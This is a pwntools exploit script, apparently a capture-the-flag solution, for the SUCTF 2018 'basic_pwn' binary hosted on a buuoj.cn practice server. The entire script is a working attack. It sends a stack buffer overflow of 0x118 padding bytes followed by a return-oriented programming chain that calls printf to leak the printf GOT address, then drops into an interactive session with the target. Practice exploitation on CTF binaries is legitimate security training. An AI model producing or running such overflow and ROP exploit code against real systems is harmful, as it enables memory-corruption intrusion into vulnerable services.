from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 28707 
elfpath = './SUCTF_2018_basic_pwn'
libcpath = ''

if args.LOCAL:
    p = process([elfpath])
    gdb.attach(p, 'b printf')
else:
    p = remote(host, port)
    
s = lambda content: p.send(content)
sl = lambda content: p.sendline(content)
r = lambda n: p.recv(n)
ru = lambda pattern: p.recvuntil(pattern)
rl = lambda: p.recvline()
ru7f = lambda: p.recvuntil(b'\x7f')
su = lambda x: p.success(x)
shell = lambda: p.interactive()

# start pwning
e = ELF(elfpath)
offset = 0x110
call_this_func = 0x401157

pop_rdi_ret = 0x401263
pop_rsi_r15_ret = 0x401261
fmt_addr = 0x402016

payload = b'a'*(offset + 8)
# payload += p64(call_this_func)
payload += p64(pop_rdi_ret) + p64(fmt_addr)
payload += p64(pop_rsi_r15_ret) + p64(e.got['printf'])
payload += p64(e.plt['printf'])
sl(payload)

shell()


